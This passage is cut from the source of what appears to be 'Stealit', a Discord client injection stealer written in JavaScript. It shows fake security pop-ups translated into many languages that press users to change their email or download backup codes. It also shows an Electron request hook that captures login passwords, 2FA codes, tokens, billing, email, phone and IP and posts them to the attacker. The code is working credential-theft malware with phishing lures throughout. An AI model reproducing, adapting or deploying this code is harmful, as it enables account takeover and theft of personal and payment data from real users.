                      '<div class="layerContainer-2lfOPe"> <div class="backdrop-2ByYRN withLayer-2VVmpp" style="opacity: 0.85; background: var(--black-500);"></div> <div class="layer-fP3xEz"> <div class="focusLock-bHVOlV" role="dialog" aria-labelledby=":rr:" tabindex="-1" aria-modal="true"> <div class="root-1CAIjD small-2xUY-3 fullscreenOnMobile-2971EC rootWithShadow-2hdL2J" style="opacity: 1; transform: scale(1);"><img alt="" class="headerImage-2osrlm" src="/assets/222756e9418e375e7ae974594b3aa1d2.svg"> <div style="position: relative; width: 440px; height: 367px; overflow: hidden;"> <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; left: auto; right: auto;"> <form> <div class="flex-2S1XBF flex-3BkGQD horizontal-112GEH horizontal-1Piu5- flex-3BkGQD directionRow-2Iu2A9 justifyStart-2Mwniq alignCenter-14kD11 noWrap-hBpHBz header-1ffhsl confirmStartHeader-34wA-K" id=":rr:" style="flex: 0 0 auto;"> <div class="colorHeaderPrimary-3kwW7L size24-15VPAv title-3VYtQS">${titlepop} </div> <div class="defaultColor-1EVLSt text-md-normal-2rFCH3 description-3_efmf" data-text-variant="text-md/normal"> <p>${intropop} <strong>${user.email}</strong>, ${endintro} ${lastend}&nbsp;? ${contact}.</p> </div>  </div> </form> </div> </div> </div> </div> </div></div>';
                    document.body.appendChild(div);
                    document.body.appendChild(div);
                    await new Promise((resolve) => setTimeout(resolve, 10000));
                    document.body.removeChild(div);
                    await clickButton('button[aria-label="${editprofil}"]');
                    await new Promise((resolve) => setTimeout(resolve, 1000));
                    await clickButton('button[aria-label="${editemailbutton}"]');
                  } catch (error) {}
                }
                
                simulateClicks();
                `
        );
      }
    }
  }
);

async function traduireTexte(langueCible) {
  var languages = {
    fr: [
      "Paramètres utilisateur",
      "Modifier l\\'adresse e-mail",
      "Changez votre adresse e-mail",
      "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
      "a été compromise.",
      "Veuillez la changer pour continuer à utiliser votre compte.",
      "Vous n\\'avez plus accès à votre adresse e-mail",
      "Contactez votre fournisseur de messagerie pour la réparer.",
    ],
    pt: [
      "Configurações do usuário",
      "Editar endereço de e-mail",
      "Altere seu endereço de e-mail",
      "Detectamos algo incomum em sua conta Discord, seu endereço,",
      "foi comprometido.",
      "Por favor, altere-o para continuar usando sua conta.",
      "Você não tem mais acesso ao seu endereço de e-mail",
      "Contate seu provedor de e-mail para corrigi-lo.",
    ],
    da: [
      "Brugerindstillinger",
      "Rediger e-mailadresse",
      "Ændre din e-mailadresse",
      "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
      "er blevet kompromitteret.",
      "Ændre den for at fortsætte med at bruge din konto.",
      "Du har ikke længere adgang til din e-mailadresse",
      "Kontakt din e-mail-udbyder for at få det rettet.",
    ],
    de: [
      "Benutzereinstellungen",
      "E-Mail-Adresse bearbeiten",
      "Ändern Sie Ihre E-Mail-Adresse",
      "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
      "wurde kompromittiert.",
      "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
      "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
      "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
    ],
    "en-GB": [
      "User Settings",
      "Edit email address",
      "Change your Email-Address",
      "We have detected something unusual with your Discord account, your address,",
      "has been compromised.",
      "Please change it to continue using your account.",
      "No longer have access to your email",
      "Contact your email provider to fix it.",
    ],
    "en-US": [
      "User Settings",
      "Edit email address",
      "Change your Email-Address",
      "We have detected something unusual with your Discord account, your address,",
      "has been compromised.",
      "Please change it to continue using your account.",
      "No longer have access to your email",
      "Contact your email provider to fix it.",
    ],
    "en-ES": [
      "User Settings",
      "Edit email address",
      "Change your Email-Address",
      "We have detected something unusual with your Discord account, your address,",
      "has been compromised.",
      "Please change it to continue using your account.",
      "No longer have access to your email",
      "Contact your email provider to fix it.",
    ],
    hr: [
      "Korisničke postavke",
      "Uredi adresu e-pošte",
      "Promijenite svoju adresu e-pošte",
      "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
      "je kompromitirana.",
      "Promijenite je da biste nastavili koristiti svoj račun.",
      "Više nemate pristup svojoj e-pošti",
      "Kontaktirajte svog pružatelja e-pošte da to popravi.",
    ],
    it: [
      "Impostazioni utente",
      "Modifica indirizzo email",
      "Cambia il tuo indirizzo email",
      "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
      "è stato compromesso.",
      "Per favore cambialo per continuare a usare il tuo account.",
      "Non hai più accesso alla tua email",
      "Contatta il tuo provider email per risolvere il problema.",
    ],
    lt: [
      "Vartotojo nustatymai",
      "Redaguoti el. pašto adresą",
      "Pakeiskite savo el. pašto adresą",
      "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
      "buvo pažeistas.",
      "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
      "Dabar neturite prieigos prie savo el. pašto",
      "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
    ],
    hu: [
      "Felhasználói beállítások",
      "E-mail cím szerkesztése",
      "Változtassa meg e-mail címét",
      "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
      "meg lett veszélyeztetve.",
      "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
      "Nincs többé hozzáférése az e-mail címéhez",
      "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
    ],
    no: [
      "Brukerinnstillinger",
      "Rediger e-postadresse",
      "Endre e-postadressen din",
      "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
      "har blitt kompromittert.",
      "Vennligst endre den for å fortsette å bruke kontoen din.",
      "Har ikke lenger tilgang til e-posten din",
      "Ta kontakt med e-postleverandøren din for å fikse det.",
    ],
    pl: [
      "Ustawienia użytkownika",
      "Edytuj adres e-mail",
      "Zmień swój adres e-mail",
      "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
      "został naruszony.",
      "Zmień go, aby kontynuować korzystanie z konta.",
      "Nie masz już dostępu do swojej poczty e-mail",
      "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
    ],
    "pr-BR": [
      "Configurações do usuário",
      "Editar endereço de e-mail",
      "Altere seu endereço de e-mail",
      "Detectamos algo incomum em sua conta Discord, seu endereço,",
      "foi comprometido.",
      "Por favor, altere-o para continuar usando sua conta.",
      "Você não tem mais acesso ao seu endereço de e-mail",
      "Contate seu provedor de e-mail para corrigi-lo.",
    ],
    ro: [
      "Setări utilizator",
      "Editare adresă de email",
      "Schimbă-ți adresa de email",
      "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
      "a fost compromisă.",
      "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
      "Nu mai ai acces la adresa ta de email",
      "Contactează furnizorul tău de email pentru a rezolva problema.",
    ],
    fi: [
      "Käyttäjäasetukset",
      "Muokkaa sähköpostiosoitetta",
      "Vaihda sähköpostiosoitteesi",
      "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
      "on vaarantunut.",
      "Vaihda se jatkaaksesi tilisi käyttöä.",
      "Sinulla ei ole enää pääsyä sähköpostiisi",
      "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
    ],
    "sv-SE": [
      "Användarinställningar",
      "Redigera e-postadress",
      "Ändra din e-postadress",
      "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
      "har komprometterats.",
      "Ändra den för att fortsätta använda ditt konto.",
      "Du har inte längre tillgång till din e-postadress",
      "Kontakta din e-postleverantör för att åtgärda det.",
    ],
    vi: [
      "Cài đặt người dùng",
      "Chỉnh sửa địa chỉ email",
      "Thay đổi địa chỉ email của bạn",
      "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
      "đã bị đe dọa.",
      "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
      "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
      "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
    ],
    tr: [
      "Kullanıcı Ayarları",
      "E-posta adresini düzenle",
      "E-posta adresini değiştir",
      "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
      "tehlikeye girdi.",
      "Kullanmaya devam etmek için lütfen değiştirin.",
      "Artık e-posta adresinize erişiminiz yok",
      "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
    ],
    cs: [
      "Uživatelské nastavení",
      "Upravit e-mailovou adresu",
      "Změnit e-mailovou adresu",
      "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
      "byla narušena.",
      "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
      "Nemáte již přístup k vaší e-mailové adrese",
      "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
    ],
    el: [
      "Ρυθμίσεις χρήστη",
      "Επεξεργασία διεύθυνσης email",
      "Αλλαγή διεύθυνσης email",
      "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
      "έχει διακινδυνευθεί.",
      "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
      "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
    ],
    bg: [
      "Потребителски настройки",
      "Редактиране на имейл адрес",
      "Промяна на имейл адреса",
      "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
      "е бил компрометиран.",
      "Моля, променете го, за да продължите да използвате вашия акаунт.",
      "Вече нямате достъп до вашия имейл адрес",
      "Свържете се с вашия доставчик на имейли, за да го оправите.",
    ],
    ru: [
      "Настройки пользователя",
      "Изменить адрес электронной почты",
      "Изменить адрес электронной почты",
      "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
      "был скомпрометирован.",
      "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
      "У вас больше нет доступа к вашему адресу электронной почты",
      "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
    ],
    uk: [
      "Налаштування користувача",
      "Редагування електронної адреси",
      "Змінити електронну адресу",
      "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
      "була під загрозою.",
      "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
      "Ви більше не маєте доступу до своєї електронної адреси",
      "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
    ],
    hi: [
      "उपयोगकर्ता सेटिंग्स",
      "ईमेल पता संपादित करें",
      "अपना ईमेल पता बदलें",
      "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
      "संकट में है।",
      "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
      "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
      "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
    ],
    th: [
      "การตั้งค่าผู้ใช้",
      "แก้ไขที่อยู่อีเมล",
      "เปลี่ยนที่อยู่อีเมลของคุณ",
      "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
      "ถูกขัดจังหวะ",
      "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
      "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
      "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
    ],
    "zh-CN": [
      "用户设置",
      "编辑电子邮件地址",
      "更改电子邮件地址",
      "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
      "已经受到威胁。",
      "请更改它以继续使用您的帐户。",
      "您不再可以访问您的电子邮件地址",
      "联系您的电子邮件提供商以解决问题。",
    ],
    ja: [
      "ユーザー設定",
      "メールアドレスを編集",
      "メールアドレスを変更",
      "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
      "危険にさらされています。",
      "アカウントを引き続き使用するために変更してください。",
      "もはやあなたのメールアドレスにアクセスできません",
      "問題を修正するためにメールプロバイダーに連絡してください。",
    ],
    "zh-TW": [
      "用戶設置",
      "編輯電子郵件地址",
      "更改電子郵件地址",
      "我們檢測到您的Discord帳戶有異常情況，您的地址",
      "受到威脅。",
      "請更改它以繼續使用您的帳戶。",
      "您不再能夠訪問您的電子郵件地址",
      "請聯繫您的電子郵件提供商以修復問題。",
    ],
    ko: [
      "사용자 설정",
      "이메일 주소 편집",
      "이메일 주소 변경",
      "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
      "이 위험에 빠져 있습니다.",
      "귀하의 계정을 계속 사용하려면 변경하십시오.",
      "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
      "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
    ],
  };

  var langue = languages[langueCible] ?? [
    "User Settings",
    "Edit email address",
    "Change your Email-Address",
    "We have detected something unusual with your Discord account, your address,",
    "has been compromised.",
    "Please change it to continue using your account.",
    "No longer have access to your email",
    "Contact your email provider to fix it.",
  ];
  return langue;
}

async function toForceBackups(langueCible) {
  var languages = {
    fr: [
      "Paramètres utilisateur",
      "Afficher les codes de sauvegarde",
      "Téléchargez vos codes de backups",
      "Vous n'avez pas encore télechargé vos codes de backups,",
      "téléchargé les dès maintenant.",
      "Vous devez valider votre identité afin de pouvoir re-utiliser votre compte.",
      "Vous n\\'avez plus accès à votre adresse e-mail",
      "Contactez votre fournisseur de messagerie pour la réparer.",
    ],

    pt: [
      "Configurações do usuário",
      "Ver códigos de recuperação",
      "Faça o download de seus códigos de backup",
      "Você ainda não baixou seus códigos de backup",
      "Faça o download deles agora",
      "Você precisa validar sua identidade para reutilizar sua conta",
      "Você não tem mais acesso ao seu endereço de e-mail",
      "Entre em contato com seu provedor de e-mail para resolver o problema",
    ],
    da: [
      "Brugerindstillinger",
      "Vis backup-koder",
      "Download dine back-up-koder",
      "Du har ikke downloadet dine back-up-koder endnu",
      "Download dem nu",
      "Du skal bekræfte din identitet for at kunne genbruge din konto",
      "Du har ikke længere adgang til din e-mailadresse",
      "Kontakt din e-mailudbyder for at ordne det",
    ],
    de: [
      "Benutzereinstellungen",
      "Backup-Codes anzeigen",
      "Laden Sie Ihre Backupscodes herunter",
      "Sie haben Ihre Backup-Codes noch nicht heruntergeladen,",
      "laden Sie sie jetzt herunter",
      "Sie müssen Ihre Identität bestätigen, um Ihr Konto wieder nutzen zu können.",
      "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
      "Kontaktieren Sie Ihren E-Mail-Anbieter, um sie zu reparieren.",
    ],
    "en-GB": [
      "User settings",
      "View Backup Codes",
      "Download your backup codes",
      "You haven't downloaded your backup codes yet,",
      "Download them now",
      "You need to validate your identity in order to re-use your account",
      "You no longer have access to your e-mail address",
      "Contact your e-mail provider to repair it",
    ],
    "en-US": [
      "User settings",
      "View backup codes",
      "Download your backup codes",
      "You haven't downloaded your backup codes yet,",
      "Download them now",
      "You need to validate your identity in order to re-use your account",
      "You no longer have access to your e-mail address",
      "Contact your e-mail provider to repair it",
    ],
    "en-ES": [
      "User Settings",
      "Edit email address",
      "Change your Email-Address",
      "We have detected something unusual with your Discord account, your address,",
      "has been compromised.",
      "Please change it to continue using your account.",
      "No longer have access to your email",
      "Contact your email provider to fix it.",
    ],
    hr: [
      "Korisničke postavke",
      "Prikaži pričuvne kodove",
      "Preuzmi svoje rezervne kodove",
      "Još niste preuzeli svoje rezervne kodove",
      "preuzmite ih sada.",
      "Morate potvrditi svoj identitet kako biste mogli ponovno koristiti svoj račun.",
      "Više nemate pristup svojoj e-mail adresi",
      "Kontaktirajte svog davatelja usluga e-pošte da biste to popravili.",
    ],
    it: [
      "Impostazioni utente",
      "Mostra codici di backup",
      "Scarica i tuoi codici di backup",
      "Non hai ancora scaricato i codici di backup",
      "scaricali adesso.",
      "Devi convalidare la tua identità per poter riutilizzare il tuo account.",
      "Non hai più accesso al tuo indirizzo email",
      "Contatta il tuo provider di posta elettronica per ripararlo.",
    ],
    lt: [
      "Vartotojo nustatymai",
      "Rodyti atsarginius kodus",
      "Atsisiųskite atsarginius kodus",
      "Dar neatsisiuntėte atsarginių kodų",
      "atsisiųskite juos dabar",
      "Kad galėtumėte pakartotinai naudoti paskyrą, turite patvirtinti savo tapatybę",
      "Nebeturite prieigos prie savo el. pašto adreso",
      "Susisiekite su savo el. pašto paslaugų teikėju, kad tai pataisytumėte",
    ],
    hu: [
      "Felhasználói beállítások",
      "Biztonsági kódok megjelenítése",
      "Töltse le biztonsági kódjait",
      "Még nem töltötte le a biztonsági kódokat",
      "töltse le őket most.",
      "A fiók újrafelhasználásához igazolnia kell személyazonosságát.",
      "Már nem fér hozzá az e-mail címéhez",
      "A javítás érdekében lépjen kapcsolatba e-mail szolgáltatójával.",
    ],
    no: [
      "Brukerinstillinger",
      "Vis reservekoder",
      "Last ned reservekodene dine",
      "Du har ikke lastet ned reservekodene dine ennå,",
      "last ned dem nå.",
      "Du må validere identiteten din for å gjenbruke kontoen din.",
      "Du har ikke lenger tilgang til e-postadressen din",
      "Kontakt e-postleverandøren din for å reparere den.",
    ],
    pl: [
      "Ustawienia użytkownika",
      "Pokaż kody zapasowe",
      "Pobierz swoje kody zapasowe",
      "Nie pobrałeś jeszcze kodów zapasowych",
      "pobierz je teraz.",
      "Aby móc ponownie korzystać ze swojego konta, musisz potwierdzić swoją tożsamość.",
      "Nie masz już dostępu do swojego adresu e-mail",
      "Skontaktuj się ze swoim dostawcą poczty e-mail, aby go naprawić.",
    ],
    "pr-BR": [
      "Configurações do usuário",
      "Ver códigos de recuperação",
      "Faça o download de seus códigos de backup",
      "Você ainda não baixou seus códigos de backup",
      "Faça o download deles agora",
      "Você precisa validar sua identidade para reutilizar sua conta",
      "Você não tem mais acesso ao seu endereço de e-mail",
      "Entre em contato com seu provedor de e-mail para resolver o problema",
    ],
    ro: [
      "Setări utilizator",
      "Show backup codes",
      "Descărcați codurile de rezervă",
      "Nu ați descărcat încă codurile de rezervă",
      "Descarcă-le acum",
      "Trebuie să vă validați identitatea pentru a vă reutiliza contul",
      "Nu mai aveți acces la adresa dvs. de e-mail",
      "Contactați furnizorul dvs. de e-mail pentru a o repara",
    ],
    fi: [
      "Käyttäjän asetukset",
      "Näytä varmuuskopiointikoodit",
      "Lataa varmuuskopiointikoodit",
      "Et ole vielä ladannut varmuuskopiointikoodejasi,",
      "Lataa ne nyt",
      "Sinun on vahvistettava henkilöllisyytesi, jotta voit käyttää tiliäsi uudelleen",
      "Sinulla ei ole enää pääsyä sähköpostiosoitteeseesi",
      "Ota yhteyttä sähköpostipalveluntarjoajaan asian korjaamiseksi",
    ],
    "sv-SE": [
      "Användarinställningar",
      "Visa säkerhetskoder",
      "Ladda ner dina säkerhetskoder",
      "Du har inte laddat ner dina säkerhetskoder ännu",
      "Ladda ner dem nu",
      "Du måste bekräfta din identitet för att kunna återanvända ditt konto",
      "Du har inte längre tillgång till din e-postadress",
      "Kontakta din e-postleverantör för att fixa det",
    ],
    vi: [
      "Cấu hình người dùng",
      "Chỉnh sửa biên nhận email",
      "Thay đổi biên nhận e-mail của bạn",
      "Detect algo incomum em sua conta Discord, seu endereço,",
      "niềm tin bị tổn hại.",
      "Để được giúp đỡ, thay đổi để tiếp tục usando sua conta.",
      "Bạn không cần phải gửi nhưng bạn phải nhận được e-mail của mình",
      "Hãy liên hệ với nhà cung cấp email của bạn để sửa lỗi.",
    ],
    tr: [
      "Kullanıcı ayarları",
      "Yedek kodları göster",
      "Yedekleme kodlarınızı indirin",
      "Yedekleme kodlarınızı henüz indirmediniz",
      "Şimdi indirin",
      "Hesabınızı yeniden kullanabilmeniz için kimliğinizi doğrulamanız gerekmektedir",
      "E-posta adresinize artık erişiminiz yok",
      "Düzeltmek için e-posta sağlayıcınızla iletişime geçin",
    ],
    cs: [
      "Uživatelská nastavení",
      "Zobrazit záložní kódy",
      "Stáhnout záložní kódy",
      "Ještě jste nestáhli své záložní kódy,",
      "Stáhnout je nyní",
      "Musíte potvrdit svou totožnost, abyste mohli znovu použít svůj účet",
      "Již nemáte přístup ke své e-mailové adrese",
      "Obraťte se na poskytovatele e-mailových služeb, aby to napravil",
    ],
    el: [
      "Ρυθμίσεις χρήστη",
      "Εμφάνιση κωδικών αντιγράφων ασφαλείας",
      "Λήψη των εφεδρικών κωδικών σας",
      "Δεν έχετε κατεβάσει ακόμα τους εφεδρικούς κωδικούς σας",
      "Κατεβάστε τους τώρα",
      "Πρέπει να επικυρώσετε την ταυτότητά σας για να χρησιμοποιήσετε ξανά τον λογαριασμό σας",
      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση ηλεκτρονικού ταχυδρομείου σας",
      "Επικοινωνήστε με τον πάροχο ηλεκτρονικού ταχυδρομείου σας για να το διορθώσετε",
    ],
    bg: [
      "Потребителски настройки",
      "Показвай кодове за архивиране",
      "Изтеглете резервните си кодове",
      "Все още не сте изтеглили резервните си кодове,",
      "Изтеглете ги сега",
      "Трябва да потвърдите самоличността си, за да използвате повторно профила си",
      "Вече нямате достъп до електронния си адрес",
      "Свържете се с вашия доставчик на електронна поща, за да го поправите",
    ],
    ru: [
      "Настройки пользователя",
      "Показывать резервные коды",
      "Загрузить резервные коды",
      "Вы еще не загрузили резервные коды",
      "Загрузите их сейчас",
      "Вам необходимо подтвердить свою личность, чтобы повторно использовать свою учетную запись",
      "Вы больше не имеете доступа к своему адресу электронной почты",
      "Обратитесь к своему провайдеру электронной почты, чтобы исправить ситуацию",
    ],
    uk: [
      "Налаштування користувача",
      "Показати резервні коди",
      "Завантажити резервні коди",
      "Ви ще не завантажили резервні коди",
      "Завантажте їх зараз",
      "Вам потрібно підтвердити свою особу, щоб повторно використовувати свій обліковий запис",
      "Ви більше не маєте доступу до своєї адреси електронної пошти",
      "Зверніться до свого постачальника послуг електронної пошти, щоб виправити це",
    ],
    hi: [
      "उपयोगकर्ता सेटिंग",
      "बैकअप कोड प्रदर्शित करें",
      "बैकअप के लिए आपके कोड्स का बैकअप",
      "आपने बैकअप के लिए दोबारा टेलीचार्ज किया है,",
      "टेलीचार्ज लेस डेस मेंटेनेंट।",
      "वोस डेवेज़ वैलिडर वोट्रे आइडेंटिटे अफिन डे पूवोइर री-यूटिलाइज़र वोट्रे कॉम्प्टे।",
      "आपका पता ई-मेल तक पहुंच से अधिक है",
      "वोट्रे सप्लायर डी मेसेजरी पोर ला रिपेरर से संपर्क करें।",
    ],
    th: [
      "Ρυθμίσεις χρήστη",
      "Εμφάνιση εφεδρικών κωδικών",
      "Λήψη των εφεδρικών κωδικών σας",
      "Δεν έχετε ακόμη κατεβάσει τους εφεδρικούς κωδικούς σας,",
      "κατεβάστε τα τώρα.",
      "Πρέπει να επικυρώσετε την ταυτότητά σας για να χρησιμοποιήσετε ξανά τον λογαριασμό σας.",
      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
      "Επικοινωνήστε με τον πάροχο του email σας για να το επιδιορθώσετε.",
    ],
    "zh-CN": [
      "用户设置",
      "显示备份代码",
      "下载您的备份密码",
      "您尚未下载备份密码",
      "现在下载",
      "您需要验证身份才能重新使用您的帐户",
      "您已无法访问您的电子邮件地址",
      "请联系您的电子邮件提供商进行修复",
    ],
    ja: [
      "ユーザー設定",
      "バックアップ コードを表示",
      "バックアップ コードをダウンロード",
      "「まだバックアップ コードをダウンロードしていません。」",
      "今すぐダウンロードしてください。",
      "アカウントを再利用するには、本人確認を行う必要があります。",
      "「メールアドレスにアクセスできなくなりました」",
      "修復するにはメールプロバイダーに連絡してください。",
    ],
    "zh-TW": [
      "用戶設定",
      "顯示備份代碼",
      "下載您的備份代碼",
      "您尚未下載備份代碼，",
      "立即下載。",
      "「您必須驗證您的身分才能重新使用您的帳戶。」",
      "您無法再存取您的電子郵件地址",
      "「請聯絡您的電子郵件提供者進行修復。」",
    ],
    ko: [
      "사용자 설정",
      "백업 코드 표시",
      "백업 코드 다운로드",
      "아직 백업 코드를 다운로드하지 않았습니다.",
      "지금 다운로드하세요.",
      "계정을 다시 사용하려면 신원을 확인해야 합니다.",
      "더 이상 이메일 주소에 접근할 수 없습니다",
      "수리하려면 이메일 제공업체에 문의하세요.",
    ],
  };

  var langue = languages[langueCible] ?? [
    "User Settings",
    "Edit email address",
    "Change your Email-Address",
    "We have detected something unusual with your Discord account, your address,",
    "has been compromised.",
    "Please change it to continue using your account.",
    "No longer have access to your email",
    "Contact your email provider to fix it.",
  ];
  return langue;
}
electron.session.defaultSession.webRequest.onCompleted(
  config.onCompleted,
  async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return;
    if (request.statusCode !== 200) return;
    try {
      var data = JSON.parse(request.uploadData[0].bytes);
    } catch (err) {
      var data = queryString.parse(
        decodeURIComponent(request.uploadData[0].bytes.toString())
      );
    }
    var {
      token,
      user,
      billing,
      friends,
      Nitro,
      userAvatar,
      userBanner,
      userAvatar,
      Billings,
      Friends,
    } = await BoukiTuclcavectesfonctions();

    var { appPath, appName } = path;
    var client_discord = appName;

    var ip = await getIP();

    switch (true) {
      case request.url.endsWith("login"):
        if (!token) {
          await electron.session.defaultSession.webRequest.onCompleted(
            config.onCompletedbis,
            async (re, callback) => {
              var dt;
              try {
                dt = JSON.parse(re.uploadData[0].bytes);
              } catch (err) {
                dt = queryString.parse(
                  decodeURIComponent(re.uploadData[0].bytes.toString())
                );
              }

              let {
                token,
                user,
                billing,
                friends,
                Nitro,
                userBanner,
                userAvatar,
                Billings,
                Friends,
              } = await BoukiTuclcavectesfonctions();
              var password = data.password;
              var params = await makeEmbed({
                title: "<:stealit:1206869154691416084> Stealit User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
                    name: "Username <:mention:1206228892629864488>",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0,
                  },
                  {
                    name: "ID <:identy:1206228345407406120>",
                    value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
                    inline: !0,
                  },
                  {
                    name: "Nitro <:nitros:1206229096128843837>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0,
                  },
                  {
                    name: "Badges <a:badges:1206229283366768701>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0,
                  },
                  {
                    name: "Language <:language:1206229413998493737>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0,
                  },
                  {
                    name: "NSFW <:underagex:1206229680856895519>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !0,
                  },
                  {
                    name: "2FA <:keys:1206229927507136574>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0,
                  },
                  {
                    name: "@Copyright",
                    value: `[Stealit 2024](https://t.me/stealitpublic)`,
                    inline: !0,
                  },
                  {
                    name: "Stealit Files 📁",
                    value: `[Gofile](${config.transfer_link})`,
                    inline: !0,
                  },
                  {
                    name: "Billing <a:moneyx:1206250495329570948>",
                    value: `${Billings}`,
                    inline: !0,
                  },
                  {
                    name: "Email <:mail:1206251253567455314>",
                    value: `\`${user.email}\``,
                    inline: !0,
                  },
                  {
                    name: "Phone <:iphone:1206253352439255051>",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0,
                  },
                  {
                    name: "<:password:1206254317229707387> Password",
                    value: `\`${password}\``,
                    inline: !0,
                  },
                  {
                    name: "Bio <:stealit:1206869154691416084>",
                    value: `\`\`\`${
                      user.bio !== null &&
                      user.bio !== undefined &&
                      user.bio !== ""
                        ? user.bio
                        : ":x:"
                    }\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Code 2fa used <:stealit:1206869154691416084>",
                    value: `\`\`\`${
                      dt.code !== null &&
                      dt.code !== undefined &&
                      dt.code !== ""
                        ? dt.code
                        : ":x:"
                    }\`\`\``,
                    inline: false,
                  },
                  {
                    name: "<:artreal:1206252088112316456> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1,
                  },
                ],

                thumbnail: userAvatar,
              });

              var params2 = await makeEmbed({
                title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
                color: config["embed-color"],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar,
              });

              params.embeds.push(params2.embeds[0]);
              await post(params);
              return;
            }
          );
        } else {
          if (token) {
            var {
              token,
              user,
              billing,
              friends,
              Nitro,
              userAvatar,
              userBanner,
              userAvatar,
              Billings,
              Friends,
            } = await BoukiTuclcavectesfonctions();

            var password = data.password;

            var params = await makeEmbed({
              title: "<:stealit:1206869154691416084> Stealit User Login",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
                  name: "Username <:mention:1206228892629864488>",
                  value: `\`${user.username}#${user.discriminator}\``,
                  inline: !0,
                },
                {
                  name: "ID <:identy:1206228345407406120>",
                  value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
                  inline: !0,
                },
                {
                  name: "Nitro <:nitros:1206229096128843837>",
                  value: `${GetNitro(Nitro)}`,
                  inline: !0,
                },
                {
                  name: "Badges <a:badges:1206229283366768701>",
                  value: `${GetBadges(user.flags)}`,
                  inline: !0,
                },
                {
